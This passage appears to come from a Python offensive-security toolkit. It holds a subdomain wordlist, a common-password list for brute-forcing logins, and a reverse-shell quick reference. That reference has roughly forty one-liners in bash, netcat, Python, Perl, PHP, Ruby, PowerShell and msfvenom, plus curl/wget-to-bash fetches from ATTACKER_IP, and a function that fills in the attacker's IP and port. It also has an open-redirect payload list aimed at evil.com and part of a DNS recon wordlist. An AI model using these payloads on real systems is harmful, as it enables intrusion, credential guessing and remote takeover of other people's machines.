    "lb","load-balancer","haproxy","nginx","traefik","ingress",
    "proxy","forward-proxy","reverse-proxy","gateway","edge",
    "firewall","waf","ids","ips","siem","security","sec",
    "vpn","openvpn","wireguard","ipsec","ssl","tls","certs",
    "pki","ca","ocsp","crl","acme","letsencrypt",
    "smtp","email","mta","mda","spam","antispam","filter",
    "postfix","sendmail","exim","qmail","courier","dovecot",
    "pop3","imap","exchange","office365","gsuite","workspace",
    "list","lists","ml","mailman","listserv","majordomo","sympa",
    "marketing","newsletter","campaign","promo","ads","ad",
    "blog","news","press","media","pr","social","community",
    "forum","forums","board","discuss","discourse","talk","chat",
    "slack","teams","meet","zoom","webex","gotomeeting","hangout",
    "video","stream","streaming","live","broadcast","cast",
    "cdn1","cdn2","cdn3","static1","static2","img1","img2",
    "media1","media2","asset1","asset2","res","resource","resources",
    "search","elasticsearch","solr","sphinx","typesense","meilisearch",
    "ai","ml","nlp","cv","data","ds","science","lab","research",
    "notebook","jupyter","colab","rstudio","airflow","mlflow",
    "model","models","predict","inference","serve","serving","training",
    "iot","device","devices","sensor","sensors","hub","edge-device",
    "firmware","embedded","rtos","plc","scada","hmi","opc",
    "map","maps","geo","location","gps","geocoding","geocoder",
    "graph","graphdb","neo4j","janusgraph","arangodb","dgraph",
    "timeseries","influxdb","prometheus","opentsdb","grafana",
    "event","events","webhook","pubsub","eventbus","eventsource",
    "notification","notify","push","fcm","apns","onesignal",
    "mobile","android","ios","react-native","flutter","capacitor",
    "pwa","spa","ssr","ssg","cdn-worker","cloudflare-worker",
    "k8s","kubernetes","openshift","rancher","docker","container",
    "registry","harbor","nexus","artifactory","jfrog","sonatype",
    "ci","jenkins","gitlab-ci","travis","circleci","github-actions",
    "sonarqube","codecov","coveralls","snyk","dependabot","whitesource",
    "terraform","ansible","puppet","chef","salt","vault","consul",
    "aws","gcp","azure","cloud","hosted","managed","saas","paas",
    "test1","test2","test3","testing","qa1","qa2","qa3","uat1","uat2",
    "dev1","dev2","dev3","develop","develop1","develop2","develop3",
    "stage","stage1","stage2","stage3","staging1","staging2","staging3",
    "prod","production","prod1","prod2","prod3","live","release",
    "old","legacy","v1","v2","v3","old-api","legacy-api","retired",
    "new","new-api","next","future","upcoming","temp","temporary",
    "alpha","beta","gamma","delta","epsilon","zeta","eta","theta",
    "us","eu","uk","de","fr","jp","au","ca","in","br","cn","sg","hk",
    "us-east","us-west","us-central","us-south","us-north",
    "eu-west","eu-central","eu-north","eu-south","eu-east",
    "ap-southeast","ap-northeast","ap-south","ap-east","ap-west",
    "me","middle-east","af","africa","la","latin-america","sea",
    "nyc","sfo","chi","lax","iad","dfw","sea","mia","bos","atl",
    "lon","par","fra","ams","mad","mil","sto","hel","zrh","vie",
    "tok","sin","hkg","syd","mel","bom","del","dxb","jnb","gru",
    "na","apac","emea","latam","global","world","international",
    "public","pub","open","external","ext","internet","web",
    "private","pvt","internal","int","local","intranet","corp",
    "guest","visitor","anon","anonymous","public-api","open-api",
    "developer","developers","partner","partners","vendor","vendors",
    "client","clients","customer","customers","user","users","member",
    "employee","employees","staff","team","teams","workspace",
    "tenant","tenants","org","orgs","organization","organizations",
    "project","projects","service","services","product","products",
    "platform","core","base","engine","runtime","sdk","tools",
    "dashboard","console","panel","management","manager","admin-panel",
    "portal","hub","center","central","main","home","root","base",
    "start","begin","launch","entry","gateway","door","front",
    "intake","ingress","input","output","sink","source","relay",
    "bridge","proxy","tunnel","pipe","bus","mesh","fabric","network",
    "access","secure","lock","vault","safe","protect","shield",
    "audit","compliance","governance","risk","policy","legal","law",
    "privacy","gdpr","hipaa","pci","sox","iso","fips","fedramp",
    "bug","bugs","issue","issues","ticket","tickets","feedback",
    "feature","features","request","requests","change","changes",
    "incident","incidents","problem","problems","error","errors",
    "report","reports","dashboard","analytics","insights","intel",
    "knowledge","kb","faq","howto","guide","guides","tutorial",
    "training","course","courses","learn","learning","education","lms",
    "exam","quiz","test","certification","cert","badge","award",
    "shop","store","ecommerce","catalog","product","products",
    "cart","checkout","payment","order","orders","shipping","track",
    "return","refund","exchange","warranty","support","rma",
    "affiliate","partner","reseller","distributor","wholesaler",
    "license","licenses","key","keys","activation","trial","free",
    "subscription","subscribe","unsubscribe","cancel","upgrade","downgrade",
    "pricing","plans","plan","tier","tiers","quota","usage","limits",
    "invoice","invoices","billing","bills","receipt","receipts","tax",
    "wallet","balance","credit","debit","topup","recharge","transfer",
    "points","reward","rewards","loyalty","coupon","coupons","promo",
    "referral","affiliate","commission","payout","payouts","withdraw",
    "kyc","aml","verify","verification","identity","document","doc",
    "photo","selfie","signature","consent","agreement","contract",
    "assets","asset","portfolio","fund","funds","account","accounts",
    "trade","trading","market","markets","exchange","invest","investing",
    "crypto","blockchain","defi","nft","web3","wallet","dapp",
    "health","medical","patient","doctor","hospital","clinic","lab",
    "prescription","pharmacy","insurance","claim","claims","benefits",
    "fitness","workout","nutrition","diet","wellness","mental-health",
    "social","friends","follow","followers","feed","timeline","wall",
    "post","posts","story","stories","reel","reels","live","stream",
    "like","comment","share","reaction","message","dm","chat","group",
    "event","events","calendar","booking","reservation","appointment",
    "ticket","tickets","venue","event-api","booking-api","reservation-api",
    "map","directions","route","navigation","search","places","poi",
    "weather","climate","forecast","alert","warning","emergency",
    "transport","travel","flight","hotel","car","ride","delivery",
    "food","restaurant","menu","order","delivery","tracking","status",
    "parcel","courier","logistics","freight","shipment","shipping",
    "job","jobs","career","careers","talent","recruiter","hr","hiring",
    "apply","application","resume","cv","interview","offer","onboard",
    "payroll","salary","benefits","expense","expenses","reimbursement",
    "finance","accounting","budget","cost","revenue","profit","loss",
    "forecast","plan","strategy","roadmap","okr","kpi","goal","goals",
    "crm","lead","leads","opportunity","opportunities","deal","deals",
    "pipeline","funnel","sales","quote","quotes","proposal","proposals",
    "project","projects","task","tasks","milestone","sprint","backlog",
    "kanban","scrum","agile","jira","asana","trello","monday","notion",
    "code","codebase","repo","repository","branch","commit","deploy",
    "build","test","lint","format","review","pr","merge","release",
    "package","packages","library","libraries","module","modules",
    "dependency","dependencies","lock","lockfile","manifest",
    "container","docker","image","layer","registry","hub","ecr","gcr",
    "function","lambda","worker","edge","compute","processor","runner",
    "scheduler","job","cron","timer","trigger","event","hook","callback",
    "secret","secrets","credential","credentials","token","tokens","key",
    "cert","certificate","ssl","tls","pem","key","pub","private",
]

                                                                                 
                                                        
                                                                                 

EXTENDED_PASSWORD_LIST = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "superman",
    "qazwsx",
    "michael",
    "football",
    "batman",
    "121212",
    "000000",
    "1q2w3e4r5t",
    "qwe123",
    "666666",
    "9999999",
    "111111",
    "1111111",
    "123321",
    "1234",
    "12345",
    "123456789",
    "1234567890",
    "qwerty123",
    "qwerty1",
    "1q2w3e",
    "1q2w3e4r",
    "1q2w3e4r5t6y",
    "zaq1zaq1",
    "iloveyou1",
    "princess",
    "welcome",
    "login",
    "hello",
    "charlie",
    "donald",
    "password1",
    "password2",
    "password3",
    "password123",
    "pa55word",
    "pa$$word",
    "p@ssword",
    "p@55word",
    "p@$$w0rd",
    "passw0rd",
    "P@ssword",
    "P@55word",
    "P@$$word",
    "Passw0rd",
    "Password1",
    "Password123",
    "admin",
    "admin123",
    "admin1234",
    "admin12345",
    "admin@123",
    "Admin@123",
    "Admin1234",
    "administrator",
    "admin2024",
    "admin2023",
    "root",
    "root123",
    "root1234",
    "toor",
    "test",
    "test123",
    "test1234",
    "testing",
    "testing123",
    "demo",
    "demo123",
    "user",
    "user123",
    "user1234",
    "guest",
    "guest123",
    "student",
    "student123",
    "teacher",
    "teacher123",
    "manager",
    "manager123",
    "office",
    "office123",
    "office2024",
    "company",
    "company123",
    "business",
    "business123",
    "secure",
    "secure123",
    "secret",
    "secret123",
    "private",
    "private123",
    "changeme",
    "changeme123",
    "change123",
    "default",
    "default123",
    "initial",
    "initial123",
    "temp",
    "temp123",
    "temporary",
    "temporary123",
    "abc",
    "abcd",
    "abcd1234",
    "abcdef",
    "abcdef123",
    "abcdefgh",
    "aaa",
    "aaaa",
    "aaaaa",
    "aaaaaa",
    "aaaaaaa",
    "aaaaaaaa",
    "qqqqqq",
    "zzzzzz",
    "xxxxxx",
    "pass",
    "pass123",
    "pass1234",
    "passwd",
    "passwd123",
    "pwd",
    "pwd123",
    "1Password",
    "passPasspassPass",
    "spring",
    "spring123",
    "summer",
    "summer123",
    "autumn",
    "autumn123",
    "winter",
    "winter123",
    "january",
    "february",
    "march",
    "april",
    "may",
    "june",
    "july",
    "august",
    "september",
    "october",
    "november",
    "december",
    "jan2024",
    "feb2024",
    "mar2024",
    "apr2024",
    "may2024",
    "jun2024",
    "jul2024",
    "aug2024",
    "sep2024",
    "oct2024",
    "nov2024",
    "dec2024",
    "jan2023",
    "feb2023",
    "mar2023",
    "apr2023",
    "may2023",
    "jun2023",
    "jul2023",
    "aug2023",
    "sep2023",
    "oct2023",
    "nov2023",
    "dec2023",
    "2024",
    "2023",
    "2022",
    "2021",
    "2020",
    "2019",
    "2018",
    "2017",
    "2016",
    "2015",
    "2014",
    "2013",
    "2012",
    "2011",
    "2010",
    "1990",
    "1991",
    "1992",
    "1993",
    "1994",
    "1995",
    "1996",
    "1997",
    "1998",
    "1999",
    "2000",
    "2001",
    "2002",
    "2003",
    "2004",
    "2005",
    "2006",
    "2007",
    "2008",
    "2009",
    "Summer2024",
    "Winter2024",
    "Spring2024",
    "Autumn2024",
    "Summer2023",
    "Winter2023",
    "Spring2023",
    "Autumn2023",
    "Welcome1",
    "Welcome!",
    "Welcome@2024",
    "Hello123",
    "Hello@123",
    "Secure123",
    "Secure@123",
    "Soccer",
    "soccer123",
    "football",
    "football123",
    "baseball",
    "baseball123",
    "basketball",
    "basketball123",
    "hockey",
    "hockey123",
    "tennis",
    "tennis123",
    "cricket",
    "cricket123",
    "golf",
    "golf123",
    "swimming",
    "swimming123",
    "wrestling",
    "wrestling123",
    "boxing",
    "boxing123",
    "volleyball",
    "volleyball123",
    "badminton",
    "badminton123",
    "table123",
    "mario",
    "mario123",
    "pokemon",
    "pokemon123",
    "pikachu",
    "pikachu123",
    "naruto",
    "naruto123",
    "dragon",
    "dragon123",
    "ninja",
    "ninja123",
    "samurai",
    "samurai123",
    "warrior",
    "warrior123",
    "hunter",
    "hunter123",
    "hunter2",
    "hunter1",
    "killer",
    "killer123",
    "alpha",
    "alpha123",
    "beta",
    "beta123",
    "gamma",
    "gamma123",
    "delta",
    "delta123",
    "omega",
    "omega123",
    "sigma",
    "sigma123",
    "thunder",
    "thunder123",
    "lightning",
    "lightning123",
    "storm",
    "storm123",
    "fire",
    "fire123",
    "water",
    "water123",
    "earth",
    "earth123",
    "wind",
    "wind123",
    "star",
    "star123",
    "moon",
    "moon123",
    "sun",
    "sun123",
    "black",
    "black123",
    "white",
    "white123",
    "red",
    "red123",
    "blue",
    "blue123",
    "green",
    "green123",
    "yellow",
    "yellow123",
    "purple",
    "purple123",
    "orange",
    "orange123",
    "pink",
    "pink123",
    "cat",
    "cat123",
    "dog",
    "dog123",
    "bird",
    "bird123",
    "fish",
    "fish123",
    "lion",
    "lion123",
    "tiger",
    "tiger123",
    "bear",
    "bear123",
    "wolf",
    "wolf123",
    "eagle",
    "eagle123",
    "shark",
    "shark123",
    "snake",
    "snake123",
    "spider",
    "spider123",
    "king",
    "king123",
    "queen",
    "queen123",
    "prince",
    "prince123",
    "princess",
    "princess123",
    "knight",
    "knight123",
    "sword",
    "sword123",
    "shield",
    "shield123",
    "castle",
    "castle123",
    "kingdom",
    "kingdom123",
    "empire",
    "empire123",
    "galaxy",
    "galaxy123",
    "universe",
    "universe123",
    "cosmos",
    "cosmos123",
    "matrix",
    "matrix123",
    "robot",
    "robot123",
    "android",
    "android123",
    "cyborg",
    "cyborg123",
    "system",
    "system123",
    "network",
    "network123",
    "server",
    "server123",
    "database",
    "database123",
    "oracle",
    "oracle123",
    "mysql",
    "mysql123",
    "postgres",
    "postgres123",
    "linux",
    "linux123",
    "windows",
    "windows123",
    "ubuntu",
    "ubuntu123",
    "debian",
    "debian123",
    "centos",
    "centos123",
    "redhat",
    "redhat123",
    "apache",
    "apache123",
    "nginx",
    "nginx123",
    "python",
    "python123",
    "django",
    "django123",
    "java",
    "java123",
    "javascript",
    "javascript123",
    "nodejs",
    "nodejs123",
    "ruby",
    "ruby123",
    "rails",
    "rails123",
    "php",
    "php123",
    "laravel",
    "laravel123",
    "golang",
    "golang123",
    "rust",
    "rust123",
    "kotlin",
    "kotlin123",
    "swift",
    "swift123",
    "flutter",
    "flutter123",
    "react",
    "react123",
    "angular",
    "angular123",
    "vue",
    "vue123",
    "docker",
    "docker123",
    "kubernetes",
    "kubernetes123",
    "ansible",
    "ansible123",
    "terraform",
    "terraform123",
    "jenkins",
    "jenkins123",
    "gitlab",
    "gitlab123",
    "github",
    "github123",
    "bitbucket",
    "bitbucket123",
    "jira",
    "jira123",
    "confluence",
    "confluence123",
    "slack",
    "slack123",
    "google",
    "google123",
    "facebook",
    "facebook123",
    "twitter",
    "twitter123",
    "instagram",
    "instagram123",
    "youtube",
    "youtube123",
    "amazon",
    "amazon123",
    "microsoft",
    "microsoft123",
    "apple",
    "apple123",
    "netflix",
    "netflix123",
    "spotify",
    "spotify123",
    "uber",
    "uber123",
    "airbnb",
    "airbnb123",
    "tiktok",
    "tiktok123",
    "linkedin",
    "linkedin123",
    "paypal",
    "paypal123",
    "stripe",
    "stripe123",
    "shopify",
    "shopify123",
    "wordpress",
    "wordpress123",
    "joomla",
    "joomla123",
    "drupal",
    "drupal123",
    "magento",
    "magento123",
    "opencart",
    "opencart123",
    "woocommerce",
    "woocommerce123",
    "prestashop",
    "prestashop123",
    "typo3",
    "typo3123",
    "ghost",
    "ghost123",
    "strapi",
    "strapi123",
    "directus",
    "directus123",
    "contentful",
    "contentful123",
    "sanity",
    "sanity123",
    "prismic",
    "prismic123",
    "craft",
    "craft123",
    "webflow",
    "webflow123",
    "squarespace",
    "squarespace123",
    "wix",
    "wix123",
    "hubspot",
    "hubspot123",
    "salesforce",
    "salesforce123",
    "marketo",
    "marketo123",
    "mailchimp",
    "mailchimp123",
    "sendgrid",
    "sendgrid123",
    "twilio",
    "twilio123",
    "zendesk",
    "zendesk123",
    "freshdesk",
    "freshdesk123",
    "intercom",
    "intercom123",
    "datadog",
    "datadog123",
    "newrelic",
    "newrelic123",
    "sentry",
    "sentry123",
    "grafana",
    "grafana123",
    "kibana",
    "kibana123",
    "splunk",
    "splunk123",
    "pagerduty",
    "pagerduty123",
    "opsgenie",
    "opsgenie123",
    "vault",
    "vault123",
    "consul",
    "consul123",
    "nomad",
    "nomad123",
    "etcd",
    "etcd123",
    "zookeeper",
    "zookeeper123",
    "rabbitmq",
    "rabbitmq123",
    "kafka",
    "kafka123",
    "redis",
    "redis123",
    "memcached",
    "memcached123",
    "elasticsearch",
    "elasticsearch123",
    "solr",
    "solr123",
    "cassandra",
    "cassandra123",
    "couchdb",
    "couchdb123",
    "mongodb",
    "mongodb123",
    "neo4j",
    "neo4j123",
    "influxdb",
    "influxdb123",
    "clickhouse",
    "clickhouse123",
    "snowflake",
    "snowflake123",
    "redshift",
    "redshift123",
    "bigquery",
    "bigquery123",
    "databricks",
    "databricks123",
    "airflow",
    "airflow123",
    "dbt",
    "dbt123",
    "luigi",
    "luigi123",
    "prefect",
    "prefect123",
    "dagster",
    "dagster123",
    "mlflow",
    "mlflow123",
    "kubeflow",
    "kubeflow123",
    "tensorflow",
    "tensorflow123",
    "pytorch",
    "pytorch123",
    "scikit",
    "scikit123",
    "pandas",
    "pandas123",
    "numpy",
    "numpy123",
    "spark",
    "spark123",
    "hadoop",
    "hadoop123",
    "hive",
    "hive123",
    "presto",
    "presto123",
    "trino",
    "trino123",
    "flink",
    "flink123",
    "storm",
    "storm123",
    "nifi",
    "nifi123",
]

                                                                                 
                                                         
                                                                                 

REVERSE_SHELL_REFERENCE = {
    "bash_tcp": (
        "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
    ),
    "bash_tcp_196": (
        "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196"
    ),
    "bash_tcp_fd": (
        "exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; "
        "do $line 2>&5 >&5; done"
    ),
    "bash_udp": (
        "sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1"
    ),
    "nc_e": (
        "nc -e /bin/sh ATTACKER_IP PORT"
    ),
    "nc_e_bash": (
        "nc -e /bin/bash ATTACKER_IP PORT"
    ),
    "nc_mkfifo": (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f"
    ),
    "nc_nmap": (
        "ncat ATTACKER_IP PORT -e /bin/bash"
    ),
    "python2_ipv4": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ),
    "python3_ipv4": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "python3_short": (
        "python3 -c 'import os,pty,socket;"
        "s=socket.socket();"
        "s.connect((\"ATTACKER_IP\",PORT));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(\"sh\")'"
    ),
    "perl_sh": (
        "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");}'"
    ),
    "php_system": (
        "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php_proc_open": (
        "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);"
        "$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
    ),
    "ruby_sh": (
        "ruby -rsocket -e 'exit if fork;"
        "c=TCPSocket.new(\"ATTACKER_IP\",PORT);"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    ),
    "ruby_short": (
        "ruby -rsocket -e 'c=TCPSocket.new(\"ATTACKER_IP\",PORT);"
        "$stdin=$stdout=$stderr=c;exec \"/bin/sh -i\"'"
    ),
    "xterm": (
        "xterm -display ATTACKER_IP:1"
    ),
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";"
        "func main(){c,_:=net.Dial(\"tcp\",\"ATTACKER_IP:PORT\");"
        "cmd:=exec.Command(\"/bin/sh\");"
        "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &"
    ),
    "java": (
        "r = Runtime.getRuntime();"
        "p = r.exec([\"/bin/bash\",\"-c\","
        "\"exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; "
        "do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()"
    ),
    "powershell_base64": (
        "powershell -nop -W hidden -noni -ep bypass -enc "
        "<BASE64_ENCODED_REVERSE_SHELL>"
    ),
    "powershell_raw": (
        "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        ";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        "$client.Close()"
    ),
    "msfvenom_exe": (
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe"
    ),
    "msfvenom_elf": (
        "msfvenom -p linux/x64/meterpreter/reverse_tcp "
        "LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf"
    ),
    "msfvenom_php": (
        "msfvenom -p php/meterpreter_reverse_tcp "
        "LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php"
    ),
    "msfvenom_asp": (
        "msfvenom -p windows/meterpreter/reverse_tcp "
        "LHOST=ATTACKER_IP LPORT=PORT -f asp -o shell.asp"
    ),
    "msfvenom_war": (
        "msfvenom -p java/jsp_shell_reverse_tcp "
        "LHOST=ATTACKER_IP LPORT=PORT -f war -o shell.war"
    ),
    "socat": (
        "socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash"
    ),
    "socat_full_tty": (
        "socat TCP-LISTEN:PORT,reuseaddr FILE:`tty`,raw,echo=0"
    ),
    "awk": (
        "awk 'BEGIN {s = \"/inet/tcp/0/ATTACKER_IP/PORT\"; while(42) "
        "{ do{ printf \"shell>\" |& s; s |& getline c; print c; "
        "while ((c |& getline) > 0) print |& s; close(c); }while(c != \"exit\") }}'"
    ),
    "lua": (
        "lua5.1 -e 'local host, port = \"ATTACKER_IP\", PORT "
        "local socket = require(\"socket\") "
        "local tcp = socket.tcp() "
        "local io = require(\"io\") "
        "tcp:connect(host, port); "
        "while true do "
        "  local cmd, status, partial = tcp:receive() "
        "  local f = io.popen(cmd) "
        "  local s = f:read(\"*a\") "
        "  f:close() "
        "  tcp:send(s) "
        "  if status == \"closed\" then break end "
        "end "
        "tcp:close()'"
    ),
    "telnet": (
        "TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | /bin/sh 1>$TF"
    ),
    "curl_bash": (
        "curl http://ATTACKER_IP/shell.sh | bash"
    ),
    "wget_bash": (
        "wget -qO- http://ATTACKER_IP/shell.sh | bash"
    ),
    "upgrade_tty_python": (
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        "\n  Ctrl+Z"
        "\n  stty raw -echo; fg"
        "\n  export TERM=xterm"
    ),
    "upgrade_tty_script": (
        "script /dev/null -c bash"
        "\n  Ctrl+Z"
        "\n  stty raw -echo; fg"
        "\n  export TERM=xterm"
    ),
    "stabilize_socat": (
        "# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:PORT"
        "\n# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT"
    ),
}


def print_reverse_shell_ref():
    _banner()
    print(f"{BLU}\n  REVERSE SHELL QUICK REFERENCE\n{RST}")
    lhost = _ask("LHOST (attacker IP)").strip() or "ATTACKER_IP"
    lport = _ask("LPORT (listener port)").strip() or "4444"
    for name, cmd in REVERSE_SHELL_REFERENCE.items():
        body = cmd.replace("ATTACKER_IP", lhost).replace("PORT", lport).replace("ATTACKER_IP:PORT", f"{lhost}:{lport}")
        print(f"\n{PUR}[{name}]{RST}")
        for line in body.split("\n"):
            print(f"  {CYN}{line}{RST}")
    _pause()


                                                                                 
                                                                  
                                                                                 

EXTENDED_OPEN_REDIRECT_PAYLOADS_2 = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/////evil.com",
    "//evil.com/%2F%2E%2E",
    "///evil.com/%2F%2E%2E",
    "http://evil.com",
    "http://evil.com/",
    "http://evil.com/@legit.com",
    "http://evil.com/legit.com",
    "http://evil.com/%2Flegit.com",
    "http://evil.com#legit.com",
    "http://evil.com?legit.com",
    "http://legit.com.evil.com",
    "http://evil.com\\@legit.com",
    "http://evil.com/\\@legit.com",
    "\\/evil.com",
    "/\\/evil.com",
    "\\/\\/evil.com",
    "/\\/\\/evil.com",
    "https:evil.com",
    "https::evil.com",
    "https://evil.com:443",
    "https://evil.com:80",
    "https://evil.com:8080",
    "https://evil.com:8443",
    "HTTPS://evil.com",
    "HTTP://evil.com",
    "%2F%2Fevil.com",
    "%2F%2Fevil.com%2F",
    "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    "%0a//evil.com",
    "%0d//evil.com",
    "%09//evil.com",
    "/%09/evil.com",
    "/%0a/evil.com",
    "/%0d/evil.com",
    "/%2F/evil.com",
    "/%5C/evil.com",
    "/%5Cevil.com",
    "/%2fev%2fil.com",
    "javascript://evil.com",
    "data:text/html,<script>location='https://evil.com'</script>",
    "http://0evil.com",
    "http://evil%2ecom",
    "http://evil%252ecom",
    "http://evil。com",
    "http://evil．com",
    "http://ｅｖｉｌ.com",
    "http://evil.com%2flegit.com%2f..",
    "http://legit.com@evil.com",
    "http://legit.com%40evil.com",
    "https://legit.com.evil.com",
    "https://legit.comevil.com",
    "https://legit.com/redirect?url=https://evil.com",
    "//google.com/%2e%2e",
    "//google.com/%2e%2e%2f",
    "//EVIL.COM",
    "//Evil.Com",
    "http://;@evil.com",
    "http://;@evil.com/",
    "http://:@evil.com/",
    "http://%40evil.com/",
    "http://@evil.com",
    "http://user:pass@evil.com",
    "http://legit.com:80@evil.com",
    "http://legit.com%3a80@evil.com",
    "http://evil.com%00.legit.com",
    "http://evil\x00.legit.com",
    "http://evil.com\x00legit.com",
    "http://evil.com%00legit.com",
    "http://evil.com/../legit.com",
    "http://evil.com%2f..%2flegit.com",
    "http://evil.com/..%2flegit.com",
    "http://evil.com/%2e%2e/legit.com",
    "http://evil.com/%2e%2e%2flegit.com",
    "http://evil.com#legit.com",
    "http://evil.com?legit.com",
    "http://evil.com/legit.com",
    "http://evil.com//legit.com",
    "http://evil.com\\legit.com",
    "http://evil.com\\\\legit.com",
    "https://evil.com?%0d%0aContent-Length:%200%0d%0a%0d%0a",
    "https://evil.com\r\nContent-Length: 0\r\n\r\n",
    "http://evil.com:443",
    "http://evil.com:80/",
    "http://EVIL.COM",
    "HTTPS://EVIL.COM",
    "HTTP://EVIL.COM",
    "HtTpS://evil.com",
    "hTtP://EVIL.COM",
    "http://evil.com%0a.legit.com",
    "http://evil.com%0d.legit.com",
    "http://evil.com%0a%0d.legit.com",
    "http://evil.com/a/b/../../",
    "http://evil.com/a/b/../../../",
    "../../evil.com",
    "../../../evil.com",
    "../../../../evil.com",
    "../..%2fevil.com",
    "..%2f..%2fevil.com",
    "%2e%2e%2fevil.com",
    "http://.evil.com",
    "http://..evil.com",
    "http://...evil.com",
    "https://.evil.com",
    "https://..evil.com",
    "http://evil.com%2e",
    "http://evil.com%2e%2e",
    "http://evil.com/.",
    "http://evil.com/..",
    "http://evil.com///legit.com",
    "http://evil.com////legit.com",
    "http://evil.com/////legit.com",
    "https://www.evil.com",
    "https://m.evil.com",
    "https://api.evil.com",
    "https://app.evil.com",
    "https://dev.evil.com",
    "https://test.evil.com",
    "https://staging.evil.com",
    "https://admin.evil.com",
    "https://evil.co",
    "https://evil.io",
    "https://evil.net",
    "https://evil.org",
    "https://evil.xyz",
    "https://evil.info",
    "https://evil.biz",
    "https://evil.us",
    "https://evil.uk",
    "https://evil.de",
    "https://evil.fr",
    "https://evil.nl",
    "https://evil.ru",
    "https://evil.cn",
    "https://evil.jp",
    "https://evil.au",
    "https://evil.ca",
    "https://evil.in",
    "https://evil.br",
]

                                                                                 
                                                                
                                                                                 

EXTENDED_DNS_RECON_WORDLIST = [
    "_dmarc","_domainkey","_acme-challenge","_caldav","_carddav",
    "_jabber","_sip","_xmpp","_http","_https","_smtp","_imap",
    "_pop3","_submission","_imaps","_pop3s","_smtps","_ldap",
    "_kerberos","_ldaps","_msdcs","_sites","_tcp","_udp",
    "_autodiscover","_autoconfig","_mta-sts","_dkim","_adsp",
    "0","01","02","03","04","05","06","07","08","09",
    "1","2","3","4","5","6","7","8","9","10",
    "11","12","13","14","15","16","17","18","19","20",
    "100","101","102","103","104","105","a1","a2","a3",
    "b1","b2","b3","c1","c2","c3","d1","d2","d3",
    "e1","e2","e3","f1","f2","f3","g1","g2","g3",
    "h1","h2","h3","i1","i2","i3","j1","j2","j3",
    "access","account","accounts","active","activity","ad",
    "admin","admin1","admin2","admin3","admin4","admin5",
    "admindev","admintest","adminpanel","adminstage","adminprod",
    "adminold","adminbackup","adminnew","adminalpha","adminbeta",
    "administrator","administrators","adminui","admincms",
    "ads","affiliate","affiliates","agent","agents","alert",
    "alerts","alpha","analysis","analytics","api","api1","api2",
    "api3","api4","api5","api6","api7","api8","api9","api10",
    "apidev","apistage","apiprod","apitest","apiold","apinew",
    "apiv1","apiv2","apiv3","apiv4","apigateway","apiproxy",
    "app","app1","app2","app3","app4","app5","application",
    "applications","apps","archive","archives","area","asset",
    "assets","autodiscover","autoconfig","autodisc","autodiscovery",
    "aws","azure","gcp","cloud","cloudapi","cloudstorage",
    "b2b","back","backend","backup","backups","billing","blog",
    "board","bot","bots","broker","build","builds","bulkmail",
    "business","cache","cached","call","calls","career","careers",
    "cart","cdn","cdnapi","certbot","certs","ci","cicd","client",
    "clients","cloud","cloudflare","code","community","company",
    "compliance","config","connect","console","contact","content",
    "control","cron","crm","customer","customers","dashboard",
